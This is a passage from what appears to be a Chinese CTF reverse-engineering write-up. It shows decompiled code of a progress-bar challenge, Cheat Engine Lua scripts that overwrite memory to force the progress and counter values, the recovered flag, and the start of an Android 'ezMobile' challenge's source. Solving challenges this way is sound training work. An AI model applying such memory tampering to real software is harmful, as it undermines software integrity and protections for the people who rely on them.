class="line">  v99 = <span class="number">-2</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v77.m128i_i64[<span class="number">0</span>] = a1;</span><br><span class="line">    v77.m128i_i64[<span class="number">1</span>] = (__int64)sub_7FF7FA01F600;</span><br><span class="line">    v82.m128i_i64[<span class="number">0</span>] = (__int64)&amp;unk_7FF7FA7E6B40;</span><br><span class="line">    v82.m128i_i64[<span class="number">1</span>] = <span class="number">1</span>i64;</span><br><span class="line">    v84.m256i_i64[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;v83 = &amp;v77;</span><br><span class="line">    *((_QWORD *)&amp;v83 + <span class="number">1</span>) = <span class="number">1</span>i64;</span><br><span class="line">    sub_7FF7FA004110(&amp;v88.m256i_u64[<span class="number">3</span>], &amp;v82);</span><br><span class="line">    v64 = <span class="number">6</span>i64;</span><br><span class="line">    v65 = v88;</span><br><span class="line">    v66 = v89;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v64 = <span class="number">6</span>i64;</span><br><span class="line">    v65.m256i_i64[<span class="number">3</span>] = <span class="number">0x8000000000000000u</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;v66 = <span class="string">&quot;Loading flag...Progress: &quot;</span>;	<span class="comment">//窗口显示</span></span><br><span class="line">    *((_QWORD *)&amp;v66 + <span class="number">1</span>) = <span class="number">15</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v67 = xmmword_7FF7FA71D190;</span><br><span class="line">  v68 = <span class="number">2</span>;</span><br><span class="line">  v69 = <span class="number">2</span>;</span><br><span class="line">  v70 = <span class="number">0</span>;</span><br><span class="line">  v71 = <span class="number">0</span>;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  v2 = fmaxf(<span class="number">0.0</span>, *(<span class="type">float</span> *)(a1 + <span class="number">40</span>));			<span class="comment">//当前进度，这里可以patch修改值（a1+40的偏移量）</span></span><br><span class="line">  *((_QWORD *)&amp;v75 + <span class="number">1</span>) = <span class="number">0x42C8000000000000</span>i64;</span><br><span class="line">  LOBYTE(v76) = <span class="number">0</span>;</span><br><span class="line">  HIDWORD(v76) = fminf(<span class="number">100.0</span>, v2);			<span class="comment">//限制在100以内</span></span><br><span class="line">  v74.m128i_i16[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  LOWORD(v75) = <span class="number">4</span>;</span><br><span class="line">  v73.m128i_i64[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v77.m128i_i64[<span class="number">0</span>] = a1 + <span class="number">40</span>;</span><br><span class="line">  v77.m128i_i64[<span class="number">1</span>] = (__int64)sub_7FF7FA030BB0;</span><br><span class="line">  v82.m128i_i64[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v82.m128i_i64[<span class="number">1</span>] = <span class="number">31</span>i64;</span><br><span class="line">  *(_QWORD *)&amp;v83 = <span class="number">2</span>i64;</span><br><span class="line">  v84.m256i_i64[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v84.m256i_i64[<span class="number">1</span>] = <span class="number">32</span>i64;</span><br><span class="line">  v84.m256i_i8[<span class="number">16</span>] = <span class="number">3</span>;</span><br><span class="line">  v88.m256i_i64[<span class="number">0</span>] = (__int64)&amp;off_7FF7FA745008;</span><br><span class="line">  v88.m256i_i64[<span class="number">1</span>] = <span class="number">2</span>i64;</span><br><span class="line">  *(_QWORD *)&amp;v89 = &amp;v82;</span><br><span class="line">  *((_QWORD *)&amp;v89 + <span class="number">1</span>) = <span class="number">1</span>i64;</span><br><span class="line">  v88.m256i_i64[<span class="number">2</span>] = (__int64)&amp;v77;</span><br><span class="line">  v88.m256i_i64[<span class="number">3</span>] = <span class="number">1</span>i64;</span><br><span class="line">  v95 = <span class="number">1</span>;</span><br><span class="line">  v94 = <span class="number">1</span>;</span><br><span class="line">  sub_7FF7FA004110(v59, &amp;v88);</span><br><span class="line">  *((_QWORD *)&amp;v83 + <span class="number">1</span>) = v59[<span class="number">0</span>];</span><br><span class="line">  v48 = <span class="number">6</span>i64;</span><br><span class="line">  v49 = v82;</span><br><span class="line">  v50 = v83;</span><br><span class="line">  v51 = v59[<span class="number">1</span>];</span><br><span class="line">  v52 = v59[<span class="number">2</span>];</span><br><span class="line">  si128 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF7FA71D1B0);</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v55 = <span class="number">2</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">0</span>;</span><br><span class="line">  v84.m256i_i64[<span class="number">0</span>] = <span class="number">0x8000000000000000u</span>i64;</span><br><span class="line">  v84.m256i_i64[<span class="number">1</span>] = (__int64)<span class="string">&quot;Speed Up!&quot;</span>;		<span class="comment">//按钮文本</span></span><br><span class="line">  v84.m256i_i64[<span class="number">2</span>] = <span class="number">9</span>i64;</span><br><span class="line">  v84.m256i_i32[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  v85.m128i_i64[<span class="number">0</span>] = <span class="number">0x3FA6666600000000</span>i64;</span><br><span class="line">  v85.m128i_i16[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">  v86.m128i_i16[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v87.m128i_i8[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  v82.m128i_i64[<span class="number">0</span>] = <span class="number">6</span>i64;</span><br><span class="line">  v87.m128i_i16[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  v86.m128i_i32[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v3 = sub_7FF7FA28BF90(<span class="number">0</span>i64, <span class="number">112</span>i64);</span><br><span class="line">  v93 = v3 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    sub_7FF7FA6FC240(<span class="number">8</span>i64, <span class="number">112</span>i64);</span><br><span class="line">  *(__m128i *)(v3 + <span class="number">64</span>) = v85;</span><br><span class="line">  *(__m128i *)(v3 + <span class="number">80</span>) = v86;</span><br><span class="line">  *(__m128i *)(v3 + <span class="number">96</span>) = v87;</span><br><span class="line">  v4 = v82;</span><br><span class="line">  v5 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;v83);</span><br><span class="line">  v6 = *(_OWORD *)v84.m256i_i8;</span><br><span class="line">  *(_OWORD *)(v3 + <span class="number">48</span>) = *(_OWORD *)&amp;v84.m256i_u64[<span class="number">2</span>];</span><br><span class="line">  *(_OWORD *)(v3 + <span class="number">32</span>) = v6;</span><br><span class="line">  *(__m128i *)(v3 + <span class="number">16</span>) = v5;</span><br><span class="line">  *(__m128i *)v3 = v4;</span><br><span class="line">  v7 = *(_WORD *)(v3 + <span class="number">72</span>) &gt;= <span class="number">2u</span>;</span><br><span class="line">  v8 = *(_WORD *)(v3 + <span class="number">80</span>) &gt;= <span class="number">2u</span>;</span><br><span class="line">  *(_QWORD *)&amp;v60 = <span class="number">0</span>i64;</span><br><span class="line">  WORD4(v61) = <span class="number">2</span> * v7;</span><br><span class="line">  LOWORD(v62) = <span class="number">2</span> * v8;</span><br><span class="line">  *((_QWORD *)&amp;v62 + <span class="number">1</span>) = v3;</span><br><span class="line">  v63.m256i_i64[<span class="number">0</span>] = (__int64)&amp;off_7FF7FA744E30;</span><br><span class="line">  *(_OWORD *)&amp;v63.m256i_u64[<span class="number">1</span>] = xmmword_7FF7FA71D1C0;</span><br><span class="line">  v63.m256i_i64[<span class="number">3</span>] = <span class="number">0</span>i64;</span><br><span class="line">  *(_OWORD *)&amp;v88.m256i_u16[<span class="number">3</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v82.m128i_i64[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v82.m128i_i64[<span class="number">1</span>] = <span class="number">8</span>i64;</span><br><span class="line">  *(_QWORD *)&amp;v83 = <span class="number">0</span>i64;</span><br><span class="line">  WORD4(v83) = <span class="number">2</span>;</span><br><span class="line">  v84.m256i_i16[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  *(_OWORD *)&amp;v84.m256i_i16[<span class="number">1</span>] = *(_OWORD *)v88.m256i_i8;</span><br><span class="line">  v84.m256i_i64[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v84.m256i_i64[<span class="number">3</span>] = <span class="number">0x7F80000041200000</span>i64;</span><br><span class="line">  v85.m128i_i16[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v98 = <span class="number">1</span>;</span><br><span class="line">  v97 = <span class="number">1</span>;</span><br><span class="line">  v96 = <span class="number">1</span>;</span><br><span class="line">  sub_7FF7FA0EBB40(&amp;v88, &amp;v82, &amp;v64);</span><br><span class="line">  v9 = sub_7FF7FA28BF90(<span class="number">0</span>i64, <span class="number">56</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    sub_7FF7FA6FC240(<span class="number">8</span>i64, <span class="number">56</span>i64);</span><br><span class="line">  v10 = _mm_loadu_si128(&amp;v73);</span><br><span class="line">  v11 = v75;</span><br><span class="line">  *(__m128i *)(v9 + <span class="number">16</span>) = _mm_loadu_si128(&amp;v74);</span><br><span class="line">  *(_OWORD *)(v9 + <span class="number">32</span>) = v11;</span><br><span class="line">  *(_QWORD *)(v9 + <span class="number">48</span>) = v76;</span><br><span class="line">  *(__m128i *)v9 = v10;</span><br><span class="line">  v12 = *(_QWORD *)(v9 + <span class="number">24</span>);</span><br><span class="line">  v13 = *(<span class="type">unsigned</span> __int16 *)(v9 + <span class="number">32</span>);</span><br><span class="line">  v14 = *(<span class="type">unsigned</span> __int16 *)(v9 + <span class="number">38</span>);</span><br><span class="line">  v92 = v9;</span><br><span class="line">  v15 = v13 | ((<span class="type">unsigned</span> __int64)*(<span class="type">unsigned</span> <span class="type">int</span> *)(v9 + <span class="number">34</span>) &lt;&lt; <span class="number">16</span>) | (v14 &lt;&lt; <span class="number">48</span>);</span><br><span class="line">  v16 = <span class="number">0x41F0000000000003</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( v13 != <span class="number">4</span> )</span><br><span class="line">    v16 = v15;</span><br><span class="line">  v17 = v12 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)v12 &gt;= <span class="number">2u</span> || v88.m256i_i16[<span class="number">12</span>] != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;v88.m256i_u32[<span class="number">6</span>] + <span class="number">2</span>) | ((<span class="type">unsigned</span> __int64)v88.m256i_u16[<span class="number">15</span>] &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    LOWORD(v12) = v88.m256i_i16[<span class="number">12</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v88.m256i_i8[<span class="number">24</span>] = v12;</span><br><span class="line">  v88.m256i_i8[<span class="number">25</span>] = BYTE1(v12);</span><br><span class="line">  v88.m256i_i8[<span class="number">26</span>] = v17;</span><br><span class="line">  v88.m256i_i8[<span class="number">27</span>] = BYTE1(v17);</span><br><span class="line">  v88.m256i_i8[<span class="number">28</span>] = BYTE2(v17);</span><br><span class="line">  v88.m256i_i8[<span class="number">29</span>] = BYTE3(v17);</span><br><span class="line">  v88.m256i_i8[<span class="number">30</span>] = BYTE4(v17);</span><br><span class="line">  v88.m256i_i8[<span class="number">31</span>] = BYTE5(v17);</span><br><span class="line">  v18 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)v16 &gt;= <span class="number">2u</span> || (_WORD)v89 != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;v89 + <span class="number">2</span>) | ((<span class="type">unsigned</span> __int64)WORD3(v89) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    LOWORD(v16) = v89;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;v89 = (<span class="type">unsigned</span> __int16)v16 | (v18 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  v19 = v88.m256i_i64[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v88.m256i_i64[<span class="number">2</span>] == v88.m256i_i64[<span class="number">0</span>] )</span><br><span class="line">    sub_7FF7FA32FCC0(&amp;v88, &amp;off_7FF7FA746D50);</span><br><span class="line">  v20 = v88.m256i_i64[<span class="number">1</span>];</span><br><span class="line">  v21 = <span class="number">16</span> * v19;</span><br><span class="line">  *(_QWORD *)(v88.m256i_i64[<span class="number">1</span>] + v21) = v92;</span><br><span class="line">  *(_QWORD *)(v20 + v21 + <span class="number">8</span>) = &amp;off_7FF7FA7448C8;</span><br><span class="line">  v22 = v19 + <span class="number">1</span>;</span><br><span class="line">  v88.m256i_i64[<span class="number">2</span>] = v22;</span><br><span class="line">  v23 = _mm_loadu_si128(&amp;v90);</span><br><span class="line">  v82 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;v88);</span><br><span class="line">  *(_OWORD *)v84.m256i_i8 = v89;</span><br><span class="line">  *(__m128i *)&amp;v84.m256i_u64[<span class="number">2</span>] = v23;</span><br><span class="line">  v85.m128i_i64[<span class="number">0</span>] = v91;</span><br><span class="line">  v83 = __PAIR128__(v88.m256i_u64[<span class="number">3</span>], v22);</span><br><span class="line">  v98 = <span class="number">1</span>;</span><br><span class="line">  v97 = <span class="number">0</span>;</span><br><span class="line">  v96 = <span class="number">0</span>;</span><br><span class="line">  sub_7FF7FA0EBB40(&amp;v88, &amp;v82, &amp;v48);</span><br><span class="line">  v24 = sub_7FF7FA28BF90(<span class="number">0</span>i64, <span class="number">80</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    sub_7FF7FA6FC240(<span class="number">8</span>i64, <span class="number">80</span>i64);</span><br><span class="line">  v25 = v60;</span><br><span class="line">  v26 = v61;</span><br><span class="line">  v27 = *(_OWORD *)v63.m256i_i8;</span><br><span class="line">  *(_OWORD *)(v24 + <span class="number">32</span>) = v62;</span><br><span class="line">  *(_OWORD *)(v24 + <span class="number">16</span>) = v26;</span><br><span class="line">  *(_OWORD *)(v24 + <span class="number">64</span>) = *(_OWORD *)&amp;v63.m256i_u64[<span class="number">2</span>];</span><br><span class="line">  *(_OWORD *)(v24 + <span class="number">48</span>) = v27;</span><br><span class="line">  *(_OWORD *)v24 = v25;</span><br><span class="line">  v92 = v24;</span><br><span class="line">  v28 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(v24 + <span class="number">24</span>));</span><br><span class="line">  v29 = v88.m256i_i16[<span class="number">12</span>];</span><br><span class="line">  v30 = (<span class="type">unsigned</span> __int64)v28.m128i_i64[<span class="number">0</span>] &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  v31 = _mm_cvtsi128_si32(v28);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)v31 &lt; <span class="number">2u</span> &amp;&amp; v88.m256i_i16[<span class="number">12</span>] == <span class="number">2</span> )</span><br><span class="line">    v29 = v31;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v30 = *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;v88.m256i_u32[<span class="number">6</span>] + <span class="number">2</span>) | ((<span class="type">unsigned</span> __int64)v88.m256i_u16[<span class="number">15</span>] &lt;&lt; <span class="number">32</span>);</span><br><span class="line">  v88.m256i_i16[<span class="number">12</span>] = v29;</span><br><span class="line">  v88.m256i_i8[<span class="number">26</span>] = v30;</span><br><span class="line">  v88.m256i_i8[<span class="number">27</span>] = BYTE1(v30);</span><br><span class="line">  v88.m256i_i8[<span class="number">28</span>] = BYTE2(v30);</span><br><span class="line">  v88.m256i_i8[<span class="number">29</span>] = BYTE3(v30);</span><br><span class="line">  v88.m256i_i8[<span class="number">30</span>] = BYTE4(v30);</span><br><span class="line">  v88.m256i_i8[<span class="number">31</span>] = BYTE5(v30);</span><br><span class="line">  v32 = v89;</span><br><span class="line">  epi16 = _mm_extract_epi16(v28, <span class="number">4</span>);</span><br><span class="line">  v34 = _mm_srli_si128(v28, <span class="number">10</span>).m128i_u64[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( epi16 &lt; <span class="number">2u</span> &amp;&amp; (_WORD)v89 == <span class="number">2</span> )</span><br><span class="line">    v32 = epi16;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v34 = *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;v89 + <span class="number">2</span>) | ((<span class="type">unsigned</span> __int64)WORD3(v89) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">  *(_QWORD *)&amp;v89 = v32 | (v34 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  v35 = v88.m256i_i64[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v88.m256i_i64[<span class="number">2</span>] == v88.m256i_i64[<span class="number">0</span>] )</span><br><span class="line">    sub_7FF7FA32FCC0(&amp;v88, &amp;off_7FF7FA746D50);</span><br><span class="line">  v36 = v88.m256i_i64[<span class="number">1</span>];</span><br><span class="line">  v37 = <span class="number">16</span> * v35;</span><br><span class="line">  *(_QWORD *)(v88.m256i_i64[<span class="number">1</span>] + v37) = v92;</span><br><span class="line">  *(_QWORD *)(v36 + v37 + <span class="number">8</span>) = &amp;off_7FF7FA744940;</span><br><span class="line">  v38 = v35 + <span class="number">1</span>;</span><br><span class="line">  v88.m256i_i64[<span class="number">2</span>] = v38;</span><br><span class="line">  v39 = _mm_loadu_si128(&amp;v90);</span><br><span class="line">  v77 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;v88);</span><br><span class="line">  v79 = v89;</span><br><span class="line">  v80 = v39;</span><br><span class="line">  v81 = v91;</span><br><span class="line">  v78 = __PAIR128__(v88.m256i_u64[<span class="number">3</span>], v38);</span><br><span class="line">  v40 = sub_7FF7FA28BF90(<span class="number">0</span>i64, <span class="number">72</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( !v40 )</span><br><span class="line">    sub_7FF7FA6FC240(<span class="number">8</span>i64, <span class="number">72</span>i64);</span><br><span class="line">  *(_QWORD *)(v40 + <span class="number">64</span>) = v81;</span><br><span class="line">  v41 = v77;</span><br><span class="line">  v42 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;v78);</span><br><span class="line">  v43 = v79;</span><br><span class="line">  *(__m128i *)(v40 + <span class="number">48</span>) = v80;</span><br><span class="line">  *(_OWORD *)(v40 + <span class="number">32</span>) = v43;</span><br><span class="line">  *(__m128i *)(v40 + <span class="number">16</span>) = v42;</span><br><span class="line">  *(__m128i *)v40 = v41;</span><br><span class="line">  v82.m128i_i64[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  *((_QWORD *)&amp;v83 + <span class="number">1</span>) = <span class="number">0x8000000000000002u</span>i64;</span><br><span class="line">  *(_OWORD *)&amp;v84.m256i_u64[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v85.m128i_i64[<span class="number">0</span>] = v40;</span><br><span class="line">  v85.m128i_i64[<span class="number">1</span>] = (__int64)&amp;off_7FF7FA744A38;</span><br><span class="line">  v86 = (__m128i)xmmword_7FF7FA71D1E0;</span><br><span class="line">  v87.m128i_i64[<span class="number">0</span>] = <span class="number">0x7F8000007F800000</span>i64;</span><br><span class="line">  v87.m128i_i16[<span class="number">4</span>] = <span class="number">256</span>;</span><br><span class="line">  v87.m128i_i8[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  result = (__m128i *)sub_7FF7FA28BF90(<span class="number">0</span>i64, <span class="number">112</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    sub_7FF7FA6FC240(<span class="number">8</span>i64, <span class="number">112</span>i64);</span><br><span class="line">  result[<span class="number">6</span>] = v87;</span><br><span class="line">  result[<span class="number">5</span>] = v86;</span><br><span class="line">  result[<span class="number">4</span>] = v85;</span><br><span class="line">  v45 = v82;</span><br><span class="line">  v46 = (__m128i)v83;</span><br><span class="line">  v47 = *(__m128i *)v84.m256i_i8;</span><br><span class="line">  result[<span class="number">3</span>] = *(__m128i *)&amp;v84.m256i_u64[<span class="number">2</span>];</span><br><span class="line">  result[<span class="number">2</span>] = v47;</span><br><span class="line">  result[<span class="number">1</span>] = v46;</span><br><span class="line">  *result = v45;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试修改v2为0xFFFFFFFF之后得到了flag的第一个字符f，但后续要求的进度越来越多，使用cheat engine进行内存操作，由于这里的地址是固定的，直接锁定地址进行修改，编写cheat engine的lua脚本：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> targetAddress = <span class="number">0x256297C04C8</span></span><br><span class="line"><span class="keyword">local</span> desiredValue = <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="keyword">local</span> checkInterval = <span class="number">50</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AutoLock</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> currentValue = readInteger(targetAddress)</span><br><span class="line">    <span class="keyword">if</span> currentValue ~= desiredValue <span class="keyword">then</span></span><br><span class="line">      writeInteger(targetAddress, desiredValue)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    sleep(checkInterval)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">createThread(AutoLock)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现进度条确实在走了，但是程序耍赖的是其第n个字符解锁需要走完n**3个进度条，而进度条的判别只有1秒钟一次，动态观察内存发现其上游8个字节有一个int指向进度条的完成个数，直接修改这个字节：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> targetAddresses = &#123;</span><br><span class="line">    &#123; addr = <span class="number">0x256297C04C0</span>, value = <span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">    &#123; addr = <span class="number">0x256297C04C8</span>, value = <span class="number">0xFFFFFFFF</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MultiModify</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">for</span> i, entry <span class="keyword">in</span> <span class="built_in">ipairs</span>(targetAddresses) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> current = readInteger(entry.addr)</span><br><span class="line">        <span class="keyword">if</span> current ~= entry.value <span class="keyword">then</span></span><br><span class="line">            writeInteger(entry.addr, entry.value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;[地址 0x%X] 修改完成: 0x%X -&gt; 0x%X&quot;</span>,</span><br><span class="line">                  entry.addr, current, entry.value))</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;[地址 0x%X] 无需修改，当前值正确&quot;</span>, entry.addr))</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 同步执行方式（立即执行）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SyncExecution</span><span class="params">()</span></span></span><br><span class="line">    MultiModify()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 异步线程方式（后台执行）</span></span><br><span class="line">createThread(MultiModify)</span><br><span class="line"><span class="comment">-- 也可以直接调用同步版本</span></span><br><span class="line"><span class="comment">-- SyncExecution()</span></span><br></pre></td></tr></table></figure>
<p>多次执行脚本得到完整的flag：<font color=deepskyblue><strong>flag{b51c3a51a0f278a60b7d966cf8eb236e}</strong></font>.</p>
<h2 id="ezMobile："><a href="#ezMobile：" class="headerlink" title="ezMobile："></a>ezMobile：</h2><p>查看源代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ctf.myapplication;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> ctf.myapplication.databinding.ActivityMainBinding;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.InMemoryDexClassLoader;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.PathClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">byte</span>[] change(<span class="type">byte</span>[] bArr);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;myapplication&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title 